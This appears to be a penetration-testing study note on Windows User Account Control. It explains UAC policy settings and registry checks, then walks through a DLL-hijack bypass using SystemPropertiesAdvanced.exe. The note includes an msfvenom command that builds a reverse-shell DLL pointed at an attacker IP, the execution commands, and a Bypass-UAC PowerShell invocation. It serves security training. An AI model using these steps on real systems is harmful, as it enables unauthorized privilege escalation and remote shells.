### Content

- [Overview](#overview)
- [Bypassing UAC](#bypassing-uac)
	- [Example](#example)
	- [Generating Malicious srrstr.dll DLL](#generating-malicious-srrstr.dll-dll)

> [!Note]
> The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line.
> See this [Video](https://www.youtube.com/watch?v=RXX0FHM9SEk) illustrating how to use it.

---
#### Overview

[User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities.

The `default RID 500 administrator` account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in depth, user experience, and UAC architecture. 
Administrators can use security policies to configure how UAC works specific to their organization at the local level (using `secpol.msc`), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment.
The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). 

There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

|Group Policy Setting|Registry Key|Default Setting|
|---|---|---|
|[User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)|FilterAdministratorToken|Disabled|
|[User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)|EnableUIADesktopToggle|Disabled|
|[User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)|ConsentPromptBehaviorAdmin|Prompt for consent for non-Windows binaries|
|[User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)|ConsentPromptBehaviorUser|Prompt for credentials on the secure desktop|
|[User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)|EnableInstallerDetection|Enabled (default for home) Disabled (default for enterprise)|
|[User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)|ValidateAdminCodeSignatures|Disabled|
|[User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)|EnableSecureUIAPaths|Enabled|
|[User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)|EnableLUA|Enabled|
|[User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)|PromptOnSecureDesktop|Enabled|
|[User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)|EnableVirtualization|Enabled|

Confirming if UAC is enabled and, if so, at what level.

```CMD
# Is it enabled ?
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1

# Check its level
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled.

---
### Bypassing UAC

UAC bypasses leverage flaws or unintended functionality in different Windows builds.

Check the build version by running `systeminfo` or `[environment]::OSVersion.Version`, then use [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page to cross reference to windows release.

#### UACME

The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.

##### Example

Let's use technique number 54:
There are trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.
One of them is the auto-elevating binary `SystemPropertiesAdvanced.exe`. 
According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.

- Type: DLL Hijack
- Method: DLL path search abuse
- Target(s): \syswow64\SystemPropertiesAdvanced.exe and other SystemProperties*.exe
- Component(s): \AppData\Local\Microsoft\WindowsApps\srrstr.dll
- Implementation: ucmEgre55Method
- Works from: Windows 10 (14393)
- Fixed in: Windows 10 19H1 (18362)
    - How: SysDm.cpl!<string>_</string>CreateSystemRestorePage has been updated for secured load library call

When attempting to locate a DLL, Windows will use the following search order:

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

We can bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` in `WindowsApps` folder, which will be loaded in an elevated context.

###### Generating Malicious srrstr.dll DLL

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

Transfer it to the target and start a listener on the attacker machine.

Running the DLL using `rundll32.exe` to get a reverse shell connection will yield in a shell without bypassed UAC.

``` PowerShell
C:\> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Running the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host will yield a UAC bypassed shell.

> [!Important]
> Before proceeding, we should ensure that any instances of the rundll32 process from our previous execution have been terminated.
> Search with rundll32 processes `tasklist /svc | findstr "rundll32"`
> Kill each process `taskkill /PID <PID> /F`

``` PowerShell
C:\> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

---
#### UAC Bypass

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

```PowerShell
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```